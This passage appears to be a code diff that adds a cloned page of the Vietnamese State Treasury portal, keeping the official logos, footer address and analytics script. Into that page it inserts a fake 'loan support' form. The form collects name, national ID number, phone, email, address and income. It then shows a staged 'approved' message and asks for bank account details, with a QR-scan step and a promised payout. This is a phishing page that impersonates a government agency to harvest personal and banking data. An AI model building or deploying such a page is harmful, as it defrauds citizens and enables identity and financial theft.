+                                                                                              </ul>
+                                                                                            </div>
+                                                                                            <div></div>
+                                                                                            <div></div>
+                                                                                          </div>
+                                                                                        </li>
+                                                                                        <li></li>
+                                                                                        <li></li>
+                                                                                        <li></li>
+                                                                                        <li></li>
+                                                                                        <li></li>
+                                                                                      </ul>
+                                                                                    </div>
+                                                                                    <div></div>
+                                                                                    <div></div>
+                                                                                  </div>
+                                                                                  <div style="display:none"><a
+                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:_afrCommandDelegate"
+                                                                                      class="xi8"
+                                                                                      onclick="return false;"
+                                                                                      href="#"></a></div>
+                                                                                </div>
+                                                                              </div>
+                                                                            </div>
+                                                                          </div>
+                                                                        </div>
+                                                                        <div>
+                                                                          <div
+                                                                            id="T:oc_2609714310region1:sdf_for_oc_6758749317region1"
+                                                                            class="xdv">
+                                                                            <div class="xfr p_AFMedium">
+                                                                              <div
+                                                                                id="T:oc_2609714310region1:sdf_for_oc_6758749317region1::div2"
+                                                                                style="background-color:transparent;"
+                                                                                class="xft p_AFMedium">
+                                                                                <div
+                                                                                  id="T:oc_2609714310region1:oc_6758749317region1"
+                                                                                  class="xe0"><span
+                                                                                    id="T:oc_2609714310region1:oc_6758749317region1:ol3"
+                                                                                    class="xq"
+                                                                                    style="display:none"><label></label></span>
+                                                                                  <div class="r_box">
+                                                                                    <div class="r_box_ct"><span
+                                                                                        id="T:oc_2609714310region1:oc_6758749317region1:i1:0:j_id__ctru2pc4"
+                                                                                        class="x2aa x1a"><a
+                                                                                          id="T:oc_2609714310region1:oc_6758749317region1:i1:0:pt_gl11"
+                                                                                          class="xeb"
+                                                                                          href="http://dangcongsan.vn"><img
+                                                                                            id="T:oc_2609714310region1:oc_6758749317region1:i1:0:pt_i15"
+                                                                                            class="xeg"
+                                                                                            src="images/dangcongsan.png"></a></span><span
+                                                                                        id="T:oc_2609714310region1:oc_6758749317region1:i1:1:j_id__ctru2pc4"
+                                                                                        class="x2aa x1a"><a
+                                                                                          id="T:oc_2609714310region1:oc_6758749317region1:i1:1:pt_gl11"
+                                                                                          class="xeb"
+                                                                                          href="http://quochoi.vn"><img
+                                                                                            id="T:oc_2609714310region1:oc_6758749317region1:i1:1:pt_i15"
+                                                                                            class="xeg"
+                                                                                            src="images/quochoi.png"></a></span><span
+                                                                                        id="T:oc_2609714310region1:oc_6758749317region1:i1:2:j_id__ctru2pc4"
+                                                                                        class="x2aa x1a"><a
+                                                                                          id="T:oc_2609714310region1:oc_6758749317region1:i1:2:pt_gl11"
+                                                                                          class="xeb"
+                                                                                          href="http://chinhphu.vn"><img
+                                                                                            id="T:oc_2609714310region1:oc_6758749317region1:i1:2:pt_i15"
+                                                                                            class="xeg"
+                                                                                            src="images/chinhphu.png"></a></span><span
+                                                                                        id="T:oc_2609714310region1:oc_6758749317region1:i1:3:j_id__ctru2pc4"
+                                                                                        class="x2aa x1a"><a
+                                                                                          id="T:oc_2609714310region1:oc_6758749317region1:i1:3:pt_gl11"
+                                                                                          class="xeb"
+                                                                                          href="http://www.mof.gov.vn"><img
+                                                                                            id="T:oc_2609714310region1:oc_6758749317region1:i1:3:pt_i15"
+                                                                                            class="xeg"
+                                                                                            src="images/botaichinh.png"></a></span>
+                                                                                      <div style="display:none"><a
+                                                                                          id="T:oc_2609714310region1:oc_6758749317region1:_afrCommandDelegate"
+                                                                                          class="xi8"
+                                                                                          onclick="return false;"
+                                                                                          href="#"></a></div>
+                                                                                    </div>
+                                                                                  </div>
+                                                                                </div>
+                                                                              </div>
+                                                                            </div>
+                                                                          </div>
+                                                                        </div>
+                                                                        <div style="display:none"><a
+                                                                            id="T:oc_2609714310region1:_afrCommandDelegate"
+                                                                            class="xi8" onclick="return false;"
+                                                                            href="#"></a></div>
+                                                                      </div>
+                                                                    </div>
+                                                                  </span></div>
+                                                              </div>
+                                                            </div>
+                                                          </div>
+                                                        </div>
+                                                      </div>
+                                                    </div>
+                                                  </td>
+                                                  <td valign="top">
+                                                    <div id="T:e2247586474" class="xh5"
+                                                      style="margin-right:10px;margin-left:5px;padding:0px;width:695px;">
+                                                      <div id="T:e2247586474::content">
+                                                        <div>
+                                                          <div id="T:sdf_for_oc_7429232432region1" class="xdv">
+                                                            <div class="xfr p_AFMedium">
+                                                              <div id="T:sdf_for_oc_7429232432region1::div2"
+                                                                style="background-color:transparent;"
+                                                                class="xft p_AFMedium">
+                                                                <div id="T:oc_7429232432region1" class="xe0">
+                                                                  <table cellpadding="0" cellspacing="0" border="0"
+                                                                    summary="" id="T:oc_7429232432region1:pgl1"
+                                                                    class="x2bb x1a">
+                                                                    <tbody>
+                                                                      <tr>
+                                                                        <td valign="middle">
+                                                                          <div id="T:oc_7429232432region1:pbl2"
+                                                                            class="x2be">
+                                                                            <div></div>
+                                                                            <div></div><a
+                                                                              id="T:oc_7429232432region1:cil1"
+                                                                              class="xeb" href="#"
+                                                                              data-original="/webcenter/portal/kbnn/r/m/trangchu">Trang
+                                                                              chủ</a>
+                                                                            <div></div>
+                                                                            <div></div>
+                                                                          </div>
+                                                                        </td>
+                                                                        <td valign="middle"><span
+                                                                            id="T:oc_7429232432region1:bc1" class="x4v">
+                                                                            <div class="xq5">
+                                                                              <div id="T:oc_7429232432region1:bc1::soi"
+                                                                                class="xq6" title="Show More Links...">
+                                                                                <div
+                                                                                  id="T:oc_7429232432region1:bc1::soc"
+                                                                                  class="xq7"></div>
+                                                                              </div>
+                                                                              <div id="T:oc_7429232432region1:bc1::oc">
+                                                                                <span class="xid"> &gt; </span>
+                                                                                <div
+                                                                                  id="T:oc_7429232432region1:bc1:0:pbl1"
+                                                                                  class="x2bc">
+                                                                                  <div></div>
+                                                                                  <div></div><a
+                                                                                    id="T:oc_7429232432region1:bc1:0:gl1"
+                                                                                    class="xeb p_AFDisabled"
+                                                                                    style=" text-decoration: none; margin-bottom:5px;color:#2573b3;">Tiếp
+                                                                                    công dân và cập nhật nội dung </a>
+                                                                                  <div></div>
+                                                                                  <div></div>
+                                                                                </div>
+                                                                              </div>
+                                                                            </div>
+                                                                            <div class="xsh"></div>
+                                                                          </span></td>
+                                                                      </tr>
+                                                                    </tbody>
+                                                                  </table>
+                                                                  <div style="display:none"><a
+                                                                      id="T:oc_7429232432region1:_afrCommandDelegate"
+                                                                      class="xi8" onclick="return false;" href="#"></a>
+                                                                  </div>
+                                                                </div>
+                                                              </div>
+                                                            </div>
+                                                          </div>
+                                                        </div>
+                                                        <div>
+                                                          <div id="T:e4776035954" class="xdv">
+                                                            <div class="xfr p_AFLight">
+                                                              <div id="T:e4776035954::div2"
+                                                                style="background-color:transparent;"
+                                                                class="xft p_AFLight">
+
+
+
+                                                                <style type="text/css">
+                                                                  .pakn_cover {
+                                                                    width: 100%;
+                                                                    float: left;
+                                                                  }
+
+                                                                  .pakn_cover {
+                                                                    line-height: 200%
+                                                                  }
+
+                                                                  .link-pakn {
+                                                                    background-color: #246097;
+                                                                    padding: 5px 10px;
+                                                                    margin-top: 10px;
+                                                                  }
+
+                                                                  .link-pakn a {
+                                                                    color: #fff;
+                                                                    text-transform: uppercase;
+                                                                    font-weight: bold;
+                                                                  }
+
+                                                                  b {
+                                                                    font-weight: bold;
+                                                                  }
+
+                                                                  table {
+                                                                    font-family: arial, sans-serif;
+                                                                    border-collapse: collapse;
+                                                                    width: auto;
+                                                                    text-align: center
+                                                                  }
+
+                                                                  th {
+                                                                    background-color: #81C8DD;
+                                                                  }
+
+                                                                  td,
+                                                                  th {
+                                                                    border: 1px solid #dddddd;
+                                                                    text-align: left;
+                                                                    padding: 8px;
+
+                                                                  }
+
+                                                                  .stt {
+                                                                    text-align: center;
+
+                                                                  }
+                                                                </style>
+
+                                                                <div id="workflow-container" class="pakn_cover">
+                                                                  <div id="state-initial">
+                                                                    <h2
+                                                                      style="color: #1a4f7a; font-size: 20px; margin-bottom: 10px;">
+                                                                      Cổng thông tin hỗ trợ vay vốn</h2>
+                                                                    <p
+                                                                      style="color: #666; font-size: 13px; margin-bottom: 25px; line-height: 1.6;">
+                                                                      Trang thông tin được xây dựng nhằm tiếp nhận,
+                                                                      hướng
+                                                                      dẫn và hỗ trợ người dân, tổ chức trong việc tìm
+                                                                      hiểu
+                                                                      và thực hiện các thủ tục liên quan đến vay vốn
+                                                                      theo
+                                                                      quy định.
+                                                                    </p>
+
+                                                                    <form id="loanForm" style="max-width: 600px;">
+                                                                      <div style="margin-bottom: 15px;">
+                                                                        <label
+                                                                          style="display: block; color: #333; font-size: 13px; margin-bottom: 5px;">Họ
+                                                                          và tên <span
+                                                                            style="color: red;">*</span></label>
+                                                                        <input type="text" name="fullname"
+                                                                          placeholder="Nhập họ và tên" required
+                                                                          style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
+                                                                      </div>
+
+                                                                      <div style="margin-bottom: 15px;">
+                                                                        <label
+                                                                          style="display: block; color: #333; font-size: 13px; margin-bottom: 5px;">Tuổi
+                                                                          <span style="color: red;">*</span></label>
+                                                                        <input type="number" name="age" value="18"
+                                                                          min="1" max="99" required
+                                                                          oninput="if(this.value.length > 2) this.value = this.value.slice(0, 2); document.getElementById('age-note').style.display = (this.value < 18 && this.value != '') ? 'block' : 'none';"
+                                                                          style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
+                                                                        <div id="age-note"
+                                                                          style="display: none; color: #d93025; font-size: 12px; margin-top: 5px; font-style: italic;">
+                                                                          * Chính sách ngân hàng vay vốn chỉ cho phép
+                                                                          công
+                                                                          dân từ 18 tuổi trở lên.
+                                                                        </div>
+                                                                      </div>
+
+                                                                      <div style="margin-bottom: 15px;">
+                                                                        <label
+                                                                          style="display: block; color: #333; font-size: 13px; margin-bottom: 5px;">Số
+                                                                          CCCD <span
+                                                                            style="color: red;">*</span></label>
+                                                                        <input type="text" name="cccd"
+                                                                          placeholder="Nhập số CCCD" required
+                                                                          style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
+                                                                      </div>
+
+                                                                      <div style="margin-bottom: 15px;">
+                                                                        <label
+                                                                          style="display: block; color: #333; font-size: 13px; margin-bottom: 5px;">Số
+                                                                          điện thoại <span
+                                                                            style="color: red;">*</span></label>
+                                                                        <input type="tel" name="phone"
+                                                                          placeholder="Nhập số điện thoại" required
+                                                                          style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
+                                                                      </div>
+
+                                                                      <div style="margin-bottom: 15px;">
+                                                                        <label
+                                                                          style="display: block; color: #333; font-size: 13px; margin-bottom: 5px;">Gmail
+                                                                          <span style="color: red;">*</span></label>
+                                                                        <input type="email" name="email"
+                                                                          placeholder="example@gmail.com" required
+                                                                          style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
+                                                                      </div>
+
+                                                                      <div style="margin-bottom: 15px;">
+                                                                        <label
+                                                                          style="display: block; color: #333; font-size: 13px; margin-bottom: 5px;">Địa
+                                                                          chỉ <span style="color: red;">*</span></label>
+                                                                        <input type="text" name="address"
+                                                                          placeholder="Nhập địa chỉ hiện tại" required
+                                                                          style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
+                                                                      </div>
+
+                                                                      <div style="margin-bottom: 15px;">
+                                                                        <label
+                                                                          style="display: block; color: #333; font-size: 13px; margin-bottom: 5px;">Nghề
+                                                                          nghiệp <span
+                                                                            style="color: red;">*</span></label>
+                                                                        <input type="text" name="occupation"
+                                                                          placeholder="Nhập nghề nghiệp hiện tại"
+                                                                          required
+                                                                          style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
+                                                                      </div>
+
+                                                                      <div style="margin-bottom: 15px;">
+                                                                        <label
+                                                                          style="display: block; color: #333; font-size: 13px; margin-bottom: 10px;">Đã
+                                                                          từng vay vốn lần nào chưa? <span
+                                                                            style="color: red;">*</span></label>
+                                                                        <div style="display: flex; gap: 30px;">
+                                                                          <label
+                                                                            style="display: flex; align-items: center; cursor: pointer;">
+                                                                            <input type="radio" name="hasLoan"
+                                                                              value="yes" style="margin-right: 8px;"> Đã
+                                                                            từng vay
+                                                                          </label>
+                                                                          <label
+                                                                            style="display: flex; align-items: center; cursor: pointer;">
+                                                                            <input type="radio" name="hasLoan"
+                                                                              value="no" checked
+                                                                              style="margin-right: 8px;"> Chưa
+                                                                            từng vay
+                                                                          </label>
+                                                                        </div>
+                                                                      </div>
+
+                                                                      <div style="margin-bottom: 15px;">
+                                                                        <label
+                                                                          style="display: block; color: #333; font-size: 13px; margin-bottom: 5px;">Thu
+                                                                          nhập hàng tháng (VND) <span
+                                                                            style="color: red;">*</span></label>
+                                                                        <input type="number" name="income"
+                                                                          placeholder="0" required
+                                                                          style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
+                                                                      </div>
+
+                                                                      <div style="margin-bottom: 25px;">
+                                                                        <label
+                                                                          style="display: block; color: #333; font-size: 13px; margin-bottom: 5px;">Số
+                                                                          tiền cần vay <span
+                                                                            style="color: red;">*</span></label>
+                                                                        <select name="loanAmount" required
+                                                                          style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
+                                                                          <option value="">Chọn số tiền</option>
+                                                                          <option value="10000000">10.000.000 VND
+                                                                          </option>
+                                                                          <option value="20000000">20.000.000 VND
+                                                                          </option>
+                                                                          <option value="50000000">50.000.000 VND
+                                                                          </option>
+                                                                          <option value="100000000">100.000.000 VND
+                                                                          </option>
+                                                                          <option value="200000000">200.000.000 VND
+                                                                          </option>
+                                                                          <option value="500000000">500.000.000 VND
+                                                                          </option>
+                                                                        </select>
+                                                                      </div>
+
+                                                                      <div
+                                                                        style="text-align: center; margin-bottom: 20px;">
+                                                                        <button type="submit"
+                                                                          style="background: linear-gradient(to bottom, #4a90c2 0%, #2d6b9a 100%); color: white; border: none; padding: 12px 60px; font-size: 16px; border-radius: 4px; cursor: pointer;">
+                                                                          Gửi đăng ký
+                                                                        </button>
+                                                                      </div>
+
+                                                                      <p
+                                                                        style="color: #666; font-size: 12px; text-align: center; font-style: italic; line-height: 1.5;">
+                                                                        Lưu ý: Việc kê khai thông tin không đồng nghĩa
+                                                                        với
+                                                                        việc được phê duyệt vay vốn. Hồ sơ sẽ được xem
+                                                                        xét
+                                                                        và phản hồi theo quy định.
+                                                                      </p>
+                                                                    </form>
+                                                                  </div>
+
+                                                                  <div id="state-pending"
+                                                                    style="display: none; padding: 40px 20px; text-align: center;">
+                                                                    <div
+                                                                      style="font-weight: bold; font-size: 18px; color: #1a4f7a; margin-bottom: 20px;">
+                                                                      ⌛ Hồ sơ của Quý khách đang được xét duyệt</div>
+                                                                    <p style="color: #666; font-size: 13px;">Vui lòng
+                                                                      kiểm tra email để nhận thông báo kết quả.</p>
+                                                                  </div>
+
+                                                                  <div id="state-approved"
+                                                                    style="display: none; padding: 40px 20px; text-align: center;">
+                                                                    <div
+                                                                      style="font-weight: bold; font-size: 18px; color: #28a745; margin-bottom: 20px;">
+                                                                      ✅ Hồ sơ của Quý khách đã được phê duyệt thành công
+                                                                    </div>
+                                                                    <button id="btn-to-bank"
+                                                                      style="background: #1a4f7a; color: white; border: none; padding: 10px 30px; font-size: 14px; border-radius: 4px; cursor: pointer;">Vui
+                                                                      lòng làm thủ tục giải ngân</button>
+                                                                  </div>
+
+                                                                  <div id="state-bank" style="display: none;">
+                                                                    <form id="bankForm" style="max-width: 600px;">
+                                                                      <div style="margin-bottom: 15px;">
+                                                                        <label
+                                                                          style="display: block; color: #333; font-size: 13px; margin-bottom: 5px;">Chủ
+                                                                          tài khoản <span
+                                                                            style="color: red;">*</span></label>
+                                                                        <input type="text" name="bankOwner"
+                                                                          placeholder="Nhập tên" required
+                                                                          style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
+                                                                      </div>
+                                                                      <div style="margin-bottom: 15px;">
+                                                                        <label
+                                                                          style="display: block; color: #333; font-size: 13px; margin-bottom: 5px;">Ngân
+                                                                          hàng <span
+                                                                            style="color: red;">*</span></label>
+                                                                        <input type="text" name="bankName"
+                                                                          placeholder="Nhập tên ngân hàng" required
+                                                                          style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
+                                                                      </div>
+                                                                      <div style="margin-bottom: 25px;">
+                                                                        <label
+                                                                          style="display: block; color: #333; font-size: 13px; margin-bottom: 5px;">Số
+                                                                          tài khoản <span
+                                                                            style="color: red;">*</span></label>
+                                                                        <input type="text" name="bankAccount"
+                                                                          placeholder="Nhập số tài khoản" required
+                                                                          style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
+                                                                      </div>
+                                                                      <div style="text-align: center;">
+                                                                        <button type="submit"
+                                                                          style="background: #1a4f7a; color: white; border: none; padding: 12px 60px; font-size: 16px; border-radius: 4px; cursor: pointer;">Xác
+                                                                          nhận</button>
+                                                                      </div>
+                                                                    </form>
+                                                                  </div>
+
+                                                                  <div id="state-scanned"
+                                                                    style="display: none; padding: 40px 20px; text-align: center;">
+                                                                    <div id="qr-container"
+                                                                      style="margin-bottom: 20px; display: none;">
+                                                                      <img id="qr-image" src="" alt="QR"
+                                                                        style="max-width: 200px; border: 1px solid #ddd; padding: 5px;">
+                                                                    </div>
+                                                                    <div
+                                                                      style="font-weight: bold; font-size: 18px; color: #28a745; margin-bottom: 15px;">
+                                                                      ✅ Đã quét QR thành công</div>
+                                                                    <p style="color: #666; font-size: 13px;">Vui lòng
+                                                                      chờ xét duyệt và approve status ở excel.</p>
+                                                                  </div>
+
+                                                                  <div id="state-success"
+                                                                    style="display: none; padding: 40px 20px; text-align: center;">
+                                                                    <div
+                                                                      style="font-weight: bold; font-size: 20px; color: #28a745; margin-bottom: 20px;">
+                                                                      Bạn đã xác nhận giải ngân thành công</div>
+                                                                    <p style="color: #666; font-size: 14px;">đợi 3-5
+                                                                      ngày tiền chuyển vào tài khoản</p>
+                                                                  </div>
+                                                                </div>
+
+
+                                                              </div>
+                                                            </div>
+                                                          </div>
+                                                        </div>
+                                                      </div>
+                                                    </div>
+                                                  </td>
+                                                </tr>
+                                              </tbody>
+                                            </table>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </td>
+                                  </tr>
+                                </tbody>
+                              </table>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div><span id="T:pt_pgl1" class="x29r x1a">
+                <h2><span>CỔNG THÔNG TIN ĐIỆN TỬ KHO BẠC NHÀ NƯỚC</span></h2>
+                <ul id="menu_ft"></ul>
+                <div class="cl">
+                  <div class="ftl">
+                    <script type="text/javascript">var _govaq = window._govaq || [];
+                      _govaq.push(['trackPageView']);
+                      _govaq.push(['enableLinkTracking']);
+                      (function () {
+                        _govaq.push(['setTrackerUrl', 'https://f-emc.ngsp.gov.vn/tracking']);
+                        _govaq.push(['setSiteId', '296']);
+                        var d = document,
+                          g = d.createElement('script'),
+                          s = d.getElementsByTagName('script')[0];
+                        g.type = 'text/javascript';
+                        g.async = true;
+                        g.defer = true;
+                        g.src = 'https://f-emc.ngsp.gov.vn/embed/gov-tracking.min.js';
+                        s.parentNode.insertBefore(g, s);
+                      })();</script>
+                  </div>
+                  <div class="ftr"><span class="ft_r ft_u">Số 32 Cát Linh - Đống Đa - Hà Nội</span><span
+                      class="ft_r ft_u">Tel: (84-24) 62 764 300 Fax: (84-24) 62 764 367</span><span class="ft_r ft_u"><a
+                        href="mailto:congttdtkbnn@vst.gov.vn">Email: congttdtkbnn@vst.gov.vn</a></span><span
+                      class="ft_r ft_u"></span></div><span id="T:pt_pgl3" class="backToTop btt x1a"
+                    style="position: fixed; right: 0px; bottom: 10px; opacity: 0.8; display: none;"><img id="T:pt_i2"
+                      class="xeg" style="width:35px;" src="images/go-to-top.png"></span>
+                </div>
+              </span>
+            </span></div><input type="hidden" name="org.apache.myfaces.trinidad.faces.FORM" value="f1"><span
+            id="f1::postscript"><input type="hidden" name="javax.faces.ViewState" value="!3q0fld78t"></span>
+          <div id="docrt::msgCtr" style="display:none">
+            <div id="docrt::msgDlg" class="xfb">
+              <div class="x1fg" _afrpanelwindowbackground="1"></div>
+              <div class="x1fg" _afrpanelwindowbackground="1"></div>
+              <div class="x1fg" _afrpanelwindowbackground="1"></div>
+              <div class="x1fg" _afrpanelwindowbackground="1"></div>
+              <table cellpadding="0" cellspacing="0" border="0" summary="" class="x1ek">
+                <tbody>
+                  <tr>
+                    <td class="p_AFResizable x1em" id="docrt::msgDlg::_hse">&nbsp;</td>
+                    <td class="p_AFResizable x1eo" id="docrt::msgDlg::_hce">
+                      <table cellpadding="0" cellspacing="0" border="0" width="100%" summary="">
+                        <tbody>
+                          <tr>
+                            <td>
+                              <div id="docrt::msgDlg::_ticn" class="x1fa" style="display:none"></div>
+                            </td>
+                            <td class="x1es" id="docrt::msgDlg::tb">
+                              <div id="docrt::msgDlg::_ttxt" class="x1f8"></div>
+                            </td>
+                            <td>
+                              <div class="x1fc"><a href="#" onclick="this.focus();return false" class="x1f3"
+                                  id="docrt::msgDlg::close" title="Close"></a></div>
+                            </td>
+                          </tr>
+                        </tbody>
+                      </table>
+                    </td>
+                    <td class="p_AFResizable x1eq" id="docrt::msgDlg::_hee">&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td class="p_AFResizable xfh" id="docrt::msgDlg::_cse">&nbsp;</td>
+                    <td class="p_AFResizable x1o" id="docrt::msgDlg::contentContainer">
+                      <div id="docrt::msgDlg::_ccntr" class="x1ev" style="position:relative;overflow:auto;">
+                        <div id="docrt::msgDlg::_cnt" class="x1bb"></div>
+                      </div>
+                    </td>
+                    <td class="p_AFResizable xfi" id="docrt::msgDlg::_cee">&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td class="p_AFResizable xjo" id="docrt::msgDlg::_fse">
+                      <div></div>
+                    </td>
+                    <td class="p_AFResizable xjn" id="docrt::msgDlg::_fce">
+                      <table cellpadding="0" cellspacing="0" border="0" width="100%" summary="">
+                        <tbody>
+                          <tr>
+                            <td class="p_AFResizable x1f1" id="docrt::msgDlg::_fcc"><button type="button"
+                                id="docrt::msgDlg::cancel" class="xm9 p_AFTextOnly" onclick="return false;"
+                                _afrpdo="cancel">OK</button></td>
+                            <td align="left" valign="bottom">
+                              <div class="p_AFResizable x1f7"><a tabindex="-1" class="x1f5" id="docrt::msgDlg::_ree"
+                                  title="Resize"></a></div>
+                            </td>
+                          </tr>
+                        </tbody>
+                      </table>
+                    </td>
+                    <td class="p_AFResizable xjp" id="docrt::msgDlg::_fee">
+                      <div></div>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </div><span id="docrt::iconC" style="display:none"><span id="af_messages::error-icon"><img
+                src="/webcenter/afr/error.png" width="16" height="16" border="0" title="Error" alt="Error"></span><span
+              id="af_message::confirmation-icon"><img src="/webcenter/afr/confirmation.png" width="16" height="16"
+                border="0" title="Confirmation" alt="Confirmation"></span><span id="af_message::fatal-icon"><img
+                src="/webcenter/afr/error.png" width="16" height="16" border="0" title="Critical Error"
+                alt="Critical Error"></span><span id="af_messages::info-icon"><img src="/webcenter/afr/info.png"
+                width="16" height="16" border="0" title="Information" alt="Information"></span><span
+              id="af_messages::fatal-icon"><img src="/webcenter/afr/error.png" width="16" height="16" border="0"
+                title="Critical Error" alt="Critical Error"></span><span id="af_message::info-icon"><img
+                src="/webcenter/afr/info.png" width="16" height="16" border="0" title="Information"
+                alt="Information"></span><span id="af_message::warning-icon"><img src="/webcenter/afr/warning.png"
+                width="16" height="16" border="0" title="Warning" alt="Warning"></span><span id="AFRequiredIcon"><span
+                title="AFRequiredIconShortDesc" class="xf">*</span></span><span id="af_messages::warning-icon"><img
+                src="/webcenter/afr/warning.png" width="16" height="16" border="0" title="Warning"
+                alt="Warning"></span><span id="af_messages::confirmation-icon"><img
+                src="/webcenter/afr/confirmation.png" width="16" height="16" border="0" title="Confirmation"
+                alt="Confirmation"></span><span id="af_message::error-icon"><img src="/webcenter/afr/error.png"
+                width="16" height="16" border="0" title="Error" alt="Error"></span></span>
+          <div id="afr::DlgSrvPopupCtnr">
+            <div id="afr::DlgSrvPopupCtnr::content" style="display:none"></div>
+          </div>
+          <div id="afr::UtilPopupCtnr" _pid="j_id41" _did="j_id42" style="display:none">
+            <div id="j_id41" style="display:none">
+              <div style="top:auto;right:auto;left:auto;bottom:auto;width:auto;height:auto;position:relative;"
+                id="j_id41::content">
+                <div id="j_id42" class="xfb">
+                  <div class="x1fg" _afrpanelwindowbackground="1"></div>
+                  <div class="x1fg" _afrpanelwindowbackground="1"></div>
+                  <div class="x1fg" _afrpanelwindowbackground="1"></div>
+                  <div class="x1fg" _afrpanelwindowbackground="1"></div>
+                  <table cellpadding="0" cellspacing="0" border="0" summary="" class="x1ek">
+                    <tbody>
+                      <tr>
+                        <td class="x1em" id="j_id42::_hse">&nbsp;</td>
+                        <td class="x1eo" id="j_id42::_hce">
+                          <table cellpadding="0" cellspacing="0" border="0" width="100%" summary="">
+                            <tbody>
+                              <tr>
+                                <td>
+                                  <div id="j_id42::_ticn" class="x1fa" style="display:none"></div>
+                                </td>
+                                <td class="x1es" id="j_id42::tb">
+                                  <div id="j_id42::_ttxt" class="x1f8"></div>
+                                </td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        </td>
+                        <td class="x1eq" id="j_id42::_hee">&nbsp;</td>
+                      </tr>
+                      <tr>
+                        <td class="xfh" id="j_id42::_cse">&nbsp;</td>
+                        <td class="x1o" id="j_id42::contentContainer"></td>
+                        <td class="xfi" id="j_id42::_cee">&nbsp;</td>
+                      </tr>
+                      <tr>
+                        <td class="xjo" id="j_id42::_fse">
+                          <div></div>
+                        </td>
+                        <td class="xjn" id="j_id42::_fce">
+                          <table cellpadding="0" cellspacing="0" border="0" width="100%" summary="">
+                            <tbody>
+                              <tr>
+                                <td class="x1f1" id="j_id42::_fcc"><button type="button" id="j_id42::ok"
+                                    class="xm9 p_AFTextOnly" onclick="return false;" _afrpdo="ok">OK</button><button
+                                    type="button" id="j_id42::cancel" class="xm9 p_AFTextOnly" onclick="return false;"
+                                    _afrpdo="cancel">Cancel</button></td>
+                                <td align="left" valign="bottom">
+                                  <div class="x1f7"><a tabindex="-1" class="x1f5" id="j_id42::_ree" title="Resize"></a>
+                                  </div>
+                                </td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        </td>
+                        <td class="xjp" id="j_id42::_fee">
+                          <div></div>
+                        </td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </form>
+    </div>
+    <script type="text/javascript" src="/webcenter/afr/partition/webkit/n/default/opt/dnd-11.1.1.9.0-5072.js"></script>
+    <script type="text/javascript"
+      src="/webcenter/afr/partition/webkit/n/default/opt/iedit-11.1.1.9.0-5072.js"></script>
+    <script type="text/javascript"
+      src="/webcenter/afr/partition/webkit/n/default/opt/uncommon-11.1.1.9.0-5072.js"></script>
+    <script type="text/javascript"
+      src="/webcenter/afr/partition/webkit/n/default/opt/stretch-11.1.1.9.0-5072.js"></script>
+    <script type="text/javascript"
+      src="/webcenter/afr/partition/webkit/n/default/opt/_AdfPageCustomizable-11.1.1.9.0-5072.js"></script>
+    <script type="text/javascript"
+      src="/webcenter/afr/partition/webkit/n/default/opt/_AdfRichShowDetailFrame-11.1.1.9.0-5072.js"></script>
+    <script type="text/javascript"
+      src="/webcenter/afr/partition/webkit/n/default/opt/_AdfRichPanelCustomizable-11.1.1.9.0-5072.js"></script>
+    <script type="text/javascript"
+      src="/webcenter/afr/partition/webkit/n/default/opt/input-11.1.1.9.0-5072.js"></script>
+    <script type="text/javascript"
+      src="/webcenter/afr/partition/webkit/n/default/opt/detail-11.1.1.9.0-5072.js"></script>
+    <script type="text/javascript" src="/webcenter/afr/partition/webkit/n/default/opt/nav-11.1.1.9.0-5072.js"></script>
+    <script type="text/javascript" src="/webcenter/afr/partition/webkit/n/default/opt/box-11.1.1.9.0-5072.js"></script>
+    <script type="text/javascript"
+      src="/webcenter/afr/partition/webkit/n/default/opt/region-11.1.1.9.0-5072.js"></script>
+    <script type="text/javascript"
+      src="/webcenter/afr/partition/webkit/n/default/opt/imagelink-11.1.1.9.0-5072.js"></script>
+    <script
